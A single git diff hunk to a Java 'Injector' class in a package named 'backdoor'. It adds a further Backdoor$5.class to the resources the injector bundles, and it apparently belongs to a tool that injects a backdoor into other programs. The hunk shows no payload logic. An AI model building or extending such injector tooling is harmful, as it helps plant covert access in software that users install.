@@ -136,6 +136,7 @@ public class Injector {
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$2.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$3.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$4.class"),
+                Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Backdoor$5.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config.class"),
                 Injector.class.getResourceAsStream("/com/thiccindustries/backdoor/Config$HelpItem.class")
         };
